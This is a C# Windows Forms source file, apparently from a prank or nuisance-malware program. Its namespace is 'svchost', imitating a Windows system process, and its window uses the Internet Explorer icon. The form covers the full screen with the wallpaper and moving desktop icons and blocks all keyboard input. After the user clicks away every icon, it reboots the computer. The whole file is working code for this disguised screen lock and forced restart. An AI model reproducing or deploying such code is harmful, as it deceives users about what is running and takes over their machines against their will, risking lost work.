using svchost.Controller;
using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace svchost.View
{
    public partial class MagicForm : Form
    {
        private Bitmap bufferedImage;
        private Graphics graphics;
        private Bitmap background;

        private DesktopFilesController controller;

        public MagicForm()
        {
            InitializeComponent();

            this.Icon = Icon.ExtractAssociatedIcon(@"C:\Program Files (x86)\Internet Explorer\iexplore.exe");

            this.Width = Screen.PrimaryScreen.Bounds.Size.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Size.Height;

            this.DoubleBuffered = true;

            this.bufferedImage = new Bitmap(this.Width, this.Height);
            this.graphics = Graphics.FromImage(bufferedImage);

            controller = new DesktopFilesController(this.ClientRectangle);

            background = (Bitmap)Bitmap.FromFile(WindowsSettings.GetWallpaperPath());

            Start();
        }

        private void Start()
        {
            Thread thread = new Thread(MovingAll);
            thread.IsBackground = true;
            thread.Start();
        }

        private void MovingAll()
        {
            while (true)
            {
                controller.MoveAll();

                this.graphics.DrawImage(background, new Rectangle(0, 0, this.Width, this.Height));


                foreach (var file in controller.Files)
                {
                    this.graphics.DrawImage(file.Image, new Rectangle(file.Location, file.Image.Size));
                }

                GC.Collect(0);

                this.BackgroundImage = bufferedImage;
                this.Invalidate();
                Thread.Sleep(200);
            }
        }

        private void MagicForm_MouseClick(object sender, MouseEventArgs e)
        {
            foreach(var file in controller.Files)
            {
                if(file.IsHit(e.Location))
                {
                    controller.Files.Remove(file);
                    break;
                }
            }

            if(controller.Files.Count == 0)
            {
                CompController.Reboot();
            }
        }

        private void MagicForm_KeyDown(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }
    }
}
